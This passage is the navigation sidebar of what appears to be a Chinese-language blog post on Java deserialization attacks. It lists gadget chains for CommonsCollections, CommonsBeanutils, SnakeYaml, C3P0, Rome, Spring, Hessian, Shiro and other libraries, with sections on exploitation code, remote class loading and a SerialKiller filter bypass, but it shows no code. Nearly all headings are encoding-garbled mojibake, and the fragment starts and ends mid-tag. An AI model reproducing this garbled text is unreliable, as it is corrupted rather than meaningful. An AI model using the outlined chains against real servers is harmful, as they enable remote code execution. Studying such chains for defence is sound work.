href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%EF%BC%88AnnotationInvocationHandler%E2%86%92TransformedMap%EF%BC%89"><span class="nav-text">åŸç†åˆ†æï¼ˆAnnotationInvocationHandlerâ†’TransformedMapï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%EF%BC%88CC3-CC4%EF%BC%89"><span class="nav-text">åˆ©ç”¨ä»£ç ï¼ˆCC3&#x2F;CC4ï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E6%83%85%E5%86%B5%EF%BC%88%E2%89%A4-JDK8u71%EF%BC%89"><span class="nav-text">ä¿®å¤æƒ…å†µï¼ˆâ‰¤ JDK8u71ï¼‰</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CC1"><span class="nav-text">CC1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%EF%BC%88AnnotationInvocationHandler%E2%86%92LazyMap%EF%BC%89"><span class="nav-text">åŸç†åˆ†æï¼ˆAnnotationInvocationHandlerâ†’LazyMapï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%EF%BC%88CC3-CC4%EF%BC%89-1"><span class="nav-text">åˆ©ç”¨ä»£ç ï¼ˆCC3&#x2F;CC4ï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E6%83%85%E5%86%B5%EF%BC%88%E2%89%A4-JDK8u71%EF%BC%89-1"><span class="nav-text">ä¿®å¤æƒ…å†µï¼ˆâ‰¤ JDK8u71ï¼‰</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CC2"><span class="nav-text">CC2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%EF%BC%88PriorityQueue%E2%86%92TransformingComparator%EF%BC%89"><span class="nav-text">åŸç†åˆ†æï¼ˆPriorityQueueâ†’TransformingComparatorï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%EF%BC%88CC4%EF%BC%89"><span class="nav-text">åˆ©ç”¨ä»£ç ï¼ˆCC4ï¼‰</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CC3"><span class="nav-text">CC3</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%EF%BC%88%E2%80%A6%E2%86%92TrAXFilter%E2%86%92InstantiateTransformer%EF%BC%89"><span class="nav-text">åŸç†åˆ†æï¼ˆâ€¦â†’TrAXFilterâ†’InstantiateTransformerï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81"><span class="nav-text">åˆ©ç”¨ä»£ç </span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#CC5%EF%BC%88CC3-CC4%EF%BC%89"><span class="nav-text">CC5ï¼ˆCC3&#x2F;CC4ï¼‰</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#CC6%EF%BC%88CC3-CC4%EF%BC%89"><span class="nav-text">CC6ï¼ˆCC3&#x2F;CC4ï¼‰</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CC4"><span class="nav-text">CC4</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%EF%BC%88CC2-TrAXFilter%EF%BC%89"><span class="nav-text">åŸç†åˆ†æï¼ˆCC2+TrAXFilterï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%EF%BC%88CC4%EF%BC%89-1"><span class="nav-text">åˆ©ç”¨ä»£ç ï¼ˆCC4ï¼‰</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CC5"><span class="nav-text">CC5</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%EF%BC%88BadAttributeValueExpException%E2%86%92TiedMapEntry%E2%86%92LazyMap%EF%BC%89"><span class="nav-text">åŸç†åˆ†æï¼ˆBadAttributeValueExpExceptionâ†’TiedMapEntryâ†’LazyMapï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%EF%BC%88CC3-CC4%EF%BC%89-2"><span class="nav-text">åˆ©ç”¨ä»£ç ï¼ˆCC3&#x2F;CC4ï¼‰</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CC6"><span class="nav-text">CC6</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%EF%BC%88HashMap%E2%86%92TiedMapEntry%E2%86%92LazyMap%EF%BC%89"><span class="nav-text">åŸç†åˆ†æï¼ˆHashMapâ†’TiedMapEntryâ†’LazyMapï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%EF%BC%88CC3-CC4%EF%BC%89-3"><span class="nav-text">åˆ©ç”¨ä»£ç ï¼ˆCC3&#x2F;CC4ï¼‰</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CC7"><span class="nav-text">CC7</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%EF%BC%88Hashtable%E2%86%92LazyMap%EF%BC%89"><span class="nav-text">åŸç†åˆ†æï¼ˆHashtableâ†’LazyMapï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%EF%BC%88CC3-CC4%EF%BC%89-4"><span class="nav-text">åˆ©ç”¨ä»£ç ï¼ˆCC3&#x2F;CC4ï¼‰</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CC8"><span class="nav-text">CC8</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%EF%BC%88TreeBag%E2%86%92TransformingComparator%EF%BC%89"><span class="nav-text">åŸç†åˆ†æï¼ˆTreeBagâ†’TransformingComparatorï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%EF%BC%88CC4%EF%BC%89-2"><span class="nav-text">åˆ©ç”¨ä»£ç ï¼ˆCC4ï¼‰</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CC9"><span class="nav-text">CC9</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%EF%BC%88HashTable%E2%86%92TiedMapEntry%E2%86%92LazyMap%EF%BC%89"><span class="nav-text">åŸç†åˆ†æï¼ˆHashTableâ†’TiedMapEntryâ†’LazyMapï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%EF%BC%88CC3-CC4%EF%BC%89-5"><span class="nav-text">åˆ©ç”¨ä»£ç ï¼ˆCC3&#x2F;CC4ï¼‰</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CC10"><span class="nav-text">CC10</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%EF%BC%88HashSet%E2%86%92TiedMapEntry%E2%86%92LazyMap%EF%BC%89"><span class="nav-text">åŸç†åˆ†æï¼ˆHashSetâ†’TiedMapEntryâ†’LazyMapï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%EF%BC%88CC3-CC4%EF%BC%89-6"><span class="nav-text">åˆ©ç”¨ä»£ç ï¼ˆCC3&#x2F;CC4ï¼‰</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CommonsBeanutils"><span class="nav-text">CommonsBeanutils</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CB1"><span class="nav-text">CB1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-text">åŸç†åˆ†æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81-1"><span class="nav-text">åˆ©ç”¨ä»£ç </span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Jxpath"><span class="nav-text">Jxpath</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="nav-text">åŸºæœ¬ä½¿ç”¨</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-text">æºç åˆ†æ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="nav-text">åˆ©ç”¨æ–¹æ³•</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E5%99%A8%E5%88%A9%E7%94%A8"><span class="nav-text">æ„é€ å™¨åˆ©ç”¨</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E5%88%A9%E7%94%A8"><span class="nav-text">é™æ€æ–¹æ³•åˆ©ç”¨</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%99%AE%E9%80%9A%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="nav-text">æ™®é€šæ–¹æ³•è°ƒç”¨</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SnakeYaml"><span class="nav-text">SnakeYaml</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8-1"><span class="nav-text">åŸºæœ¬ä½¿ç”¨</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Java%E5%AF%B9%E8%B1%A1-%E2%86%92-YAML%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-text">Javaå¯¹è±¡ â†’ YAMLå­—ç¬¦ä¸²</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#YAML-%E2%86%92-%E5%BC%BA%E7%B1%BB%E5%9E%8B%E5%AF%B9%E8%B1%A1"><span class="nav-text">YAML â†’ å¼ºç±»å‹å¯¹è±¡</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-1"><span class="nav-text">åˆ©ç”¨æ–¹æ³•</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ScriptEngineManager"><span class="nav-text">ScriptEngineManager</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SpringFramework-%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E9%85%8D%E7%BD%AE"><span class="nav-text">SpringFramework è¿œç¨‹åŠ è½½é…ç½®</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD%E6%9C%AC%E5%9C%B0-jar"><span class="nav-text">å†™æ–‡ä»¶åŠ è½½æœ¬åœ° jar</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#C3P0"><span class="nav-text">C3P0</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E7%B1%BB%E5%8A%A0%E8%BD%BD%EF%BC%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91%EF%BC%89"><span class="nav-text">è¿œç¨‹ç±»åŠ è½½ï¼ˆååºåˆ—åŒ–è§¦å‘ï¼‰</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-1"><span class="nav-text">åŸç†åˆ†æ</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B"><span class="nav-text">åºåˆ—åŒ–è¿‡ç¨‹</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B"><span class="nav-text">ååºåˆ—åŒ–è¿‡ç¨‹</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81-2"><span class="nav-text">åˆ©ç”¨ä»£ç </span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88setter-%E8%A7%A6%E5%8F%91%EF%BC%89"><span class="nav-text">äºŒæ¬¡ååºåˆ—åŒ–ï¼ˆsetter è§¦å‘ï¼‰</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-2"><span class="nav-text">åŸç†åˆ†æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81-3"><span class="nav-text">åˆ©ç”¨ä»£ç </span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JNDI%EF%BC%88setter-%E8%A7%A6%E5%8F%91%EF%BC%89"><span class="nav-text">JNDIï¼ˆsetter è§¦å‘ï¼‰</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-3"><span class="nav-text">åŸç†åˆ†æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81-4"><span class="nav-text">åˆ©ç”¨ä»£ç </span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#AspectJWeaver"><span class="nav-text">AspectJWeaver</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%EF%BC%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91%EF%BC%89"><span class="nav-text">ä»»æ„æ–‡ä»¶å†™ï¼ˆååºåˆ—åŒ–è§¦å‘ï¼‰</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-4"><span class="nav-text">åŸç†åˆ†æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81-5"><span class="nav-text">åˆ©ç”¨ä»£ç </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SerialKiller-%E7%BB%95%E8%BF%87"><span class="nav-text">SerialKiller ç»•è¿‡</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MapTransformer"><span class="nav-text">MapTransformer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#FactoryTransformer"><span class="nav-text">FactoryTransformer</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">äºŒæ¬¡ååºåˆ—åŒ–</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Rome"><span class="nav-text">Rome</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE"><span class="nav-text">ååºåˆ—åŒ–é“¾</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-5"><span class="nav-text">åŸç†åˆ†æ</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#toString-%E2%86%92-getter"><span class="nav-text">toString â†’ getter</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hashCode-%E2%86%92-toString"><span class="nav-text">hashCode â†’ toString</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81-6"><span class="nav-text">åˆ©ç”¨ä»£ç </span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A0%E8%BD%BD"><span class="nav-text">å­—èŠ‚ç åŠ è½½</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JNDI"><span class="nav-text">JNDI</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Spring"><span class="nav-text">Spring</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XML-%E9%85%8D%E7%BD%AE-RCE"><span class="nav-text">XML é…ç½® RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Spring-XML-Bean"><span class="nav-text">Spring XML Bean</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#XML-%E8%A3%85%E9%85%8D%E8%BF%87%E7%A8%8B"><span class="nav-text">XML è£…é…è¿‡ç¨‹</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95"><span class="nav-text">å¸¸ç”¨è¯­æ³•</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B%E5%8C%96%E7%B1%BB"><span class="nav-text">å®ä¾‹åŒ–ç±»</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95"><span class="nav-text">è°ƒç”¨æ–¹æ³•</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="nav-text">å‡ºç½‘åˆ©ç”¨</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="nav-text">ä¸å‡ºç½‘åˆ©ç”¨</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E5%8C%B9%E9%85%8D%E8%B7%AF%E5%BE%84"><span class="nav-text">é€šé…ç¬¦åŒ¹é…è·¯å¾„</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Tomcat-%E5%AE%89%E8%A3%85%E7%9B%AE%E5%BD%95%E5%AE%9A%E4%BD%8D"><span class="nav-text">Tomcat å®‰è£…ç›®å½•å®šä½</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE-1"><span class="nav-text">ååºåˆ—åŒ–é“¾</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Spring1"><span class="nav-text">Spring1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-6"><span class="nav-text">åŸç†åˆ†æ</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81-7"><span class="nav-text">åˆ©ç”¨ä»£ç </span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E6%83%85%E5%86%B5%EF%BC%88%E2%89%A4-JDK8u71%EF%BC%89-2"><span class="nav-text">ä¿®å¤æƒ…å†µï¼ˆâ‰¤ JDK8u71ï¼‰</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Spring2"><span class="nav-text">Spring2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-7"><span class="nav-text">åŸç†åˆ†æ</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81-8"><span class="nav-text">åˆ©ç”¨ä»£ç </span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Hessian"><span class="nav-text">Hessian</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%AF%B9%E8%B1%A1"><span class="nav-text">å…³é”®å¯¹è±¡</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%8E%82"><span class="nav-text">åºåˆ—åŒ–å·¥å‚</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IO-%E6%B5%81%E5%AF%B9%E8%B1%A1"><span class="nav-text">IO æµå¯¹è±¡</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E5%8F%8D%EF%BC%89%E5%BA%8F%E5%88%97%E5%8C%96%E5%99%A8"><span class="nav-text">ï¼ˆåï¼‰åºåˆ—åŒ–å™¨</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8-2"><span class="nav-text">åŸºæœ¬ä½¿ç”¨</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%EF%BC%88RPC%EF%BC%89"><span class="nav-text">è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼ˆRPCï¼‰</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E-Servlet-%E7%9A%84%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="nav-text">åŸºäº Servlet çš„æœåŠ¡ç«¯</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E-Spring-%E7%9A%84%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="nav-text">åŸºäº Spring çš„æœåŠ¡ç«¯</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="nav-text">å®¢æˆ·ç«¯</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="nav-text">æºç åˆ†æ</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="nav-text">æœåŠ¡ç«¯</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E8%BF%87%E7%A8%8B"><span class="nav-text">åˆå§‹åŒ–è¿‡ç¨‹</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82%E5%A4%84%E7%90%86%E8%BF%87%E7%A8%8B"><span class="nav-text">è¯·æ±‚å¤„ç†è¿‡ç¨‹</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B-1"><span class="nav-text">ååºåˆ—åŒ–è¿‡ç¨‹</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SerializerFactory-%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="nav-text">SerializerFactory åˆå§‹åŒ–</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B4%BE%E5%8F%91"><span class="nav-text">ååºåˆ—åŒ–æ´¾å‘</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%99%A8%E8%8E%B7%E5%8F%96"><span class="nav-text">ååºåˆ—åŒ–å™¨è·å–</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Map-%E7%B1%BB%E5%9E%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">Map ç±»å‹ååºåˆ—åŒ–</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%99%AE%E9%80%9A%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">æ™®é€šç±»ååºåˆ—åŒ–</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF-1"><span class="nav-text">å®¢æˆ·ç«¯</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Map-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">Map ååºåˆ—åŒ–</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ROME-SignedObject"><span class="nav-text">ROME + SignedObject</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-8"><span class="nav-text">åŸç†åˆ†æ</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81-9"><span class="nav-text">åˆ©ç”¨ä»£ç </span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Resin"><span class="nav-text">Resin</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-9"><span class="nav-text">åŸç†åˆ†æ</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81-10"><span class="nav-text">åˆ©ç”¨ä»£ç </span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E6%83%85%E5%86%B5%EF%BC%88-JDK8u191%EF%BC%89"><span class="nav-text">ä¿®å¤æƒ…å†µï¼ˆ&lt; JDK8u191ï¼‰</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%82%E5%B8%B8"><span class="nav-text">ååºåˆ—åŒ–å¼‚å¸¸</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Kryo"><span class="nav-text">Kryo</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Dubbo"><span class="nav-text">Dubbo</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shiro"><span class="nav-text">Shiro</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Shiro-%E5%85%B3%E9%94%AE%E7%BB%84%E4%BB%B6"><span class="nav-text">Shiro å…³é”®ç»„ä»¶</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Subject"><span class="nav-text">Subject</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SecurityManager%EF%BC%88%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%EF%BC%89"><span class="nav-text">SecurityManagerï¼ˆå®‰å…¨ç®¡ç†å™¨ï¼‰</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Authenticator%EF%BC%88%E8%AE%A4%E8%AF%81%E5%99%A8%EF%BC%89"><span class="nav-text">Authenticatorï¼ˆè®¤è¯å™¨ï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Authorizer%EF%BC%88%E6%8E%88%E6%9D%83%E5%99%A8%EF%BC%89"><span class="nav-text">Authorizerï¼ˆæˆæƒå™¨ï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" 